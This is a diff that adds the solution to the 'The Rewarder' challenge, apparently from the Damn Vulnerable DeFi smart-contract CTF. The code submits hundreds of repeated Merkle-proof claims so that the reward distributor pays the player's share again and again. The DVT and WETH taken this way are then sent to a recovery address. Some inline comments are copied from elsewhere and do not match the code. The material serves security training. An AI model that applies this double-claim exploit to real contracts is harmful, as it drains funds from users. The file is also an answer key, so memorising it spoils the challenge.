@@ -148,7 +148,76 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+
+        uint256 PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint256 PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+         // Calculate roots for DVT and WETH distributions
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        merkle = new Merkle();
+        dvtRoot = merkle.getRoot(dvtLeaves);
+        wethRoot = merkle.getRoot(wethLeaves);
+        /*
+        bytes32 dvtTargetHash = keccak256(abi.encodePacked(address(player),PLAYER_DVT_CLAIM_AMOUNT));
+        bytes32 wethTargetHash = keccak256(abi.encodePacked(address(player),PLAYER_WETH_CLAIM_AMOUNT));
+        uint fakeDvtAmount = 0;
+        uint fakeWethAmount = 0;
+        uint maxTime = 100000;
+        uint start = 10e18;
+        for (uint i=0;i<maxTime;i++){
+            if(dvtTargetHash == keccak256(abi.encodePacked(address(player),i))){
+                fakeDvtAmount = start;
+            }
+            if(fakeDvtAmount!=0){
+                break;
+            }
+            start-=120;
+        }
+        start = 1e18;
+        for (uint i=0;i<maxTime;i++){
+            if(wethTargetHash == keccak256(abi.encodePacked(address(player),i))){
+                fakeWethAmount = start;
+            }
+            if(fakeWethAmount!=0){
+                break;
+            }
+            start-=12;
+        }
+        */
+        Claim[] memory dvtClaims = new Claim[](867);
+        Claim[] memory wethClaims = new Claim[](853);
+        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, 188);
+        bytes32[] memory wethProof = merkle.getProof(wethLeaves, 188);
+        for(uint i=0;i<867;i++){
+            dvtClaims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first WETH batch
+                amount: PLAYER_DVT_CLAIM_AMOUNT,
+                tokenIndex: 0, // claim corresponds to second token in `tokensToClaim` array
+                proof: dvtProof // Alice's address is at index 2
+            });
+        }
+        for(uint i=0;i<853;i++){
+            wethClaims[i] = Claim({
+                batchNumber: 0, // claim corresponds to first WETH batch
+                amount: PLAYER_WETH_CLAIM_AMOUNT,
+                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                proof: wethProof // Alice's address is at index 2
+            });
+        }
+
+
         
+       
+  
+        distributor.claimRewards({inputClaims: wethClaims, inputTokens: tokensToClaim});
+        distributor.claimRewards({inputClaims: dvtClaims, inputTokens: tokensToClaim});
+        dvt.transfer(recovery,dvt.balanceOf(player));
+        weth.transfer(recovery,weth.balanceOf(player));
     }
 
     /**
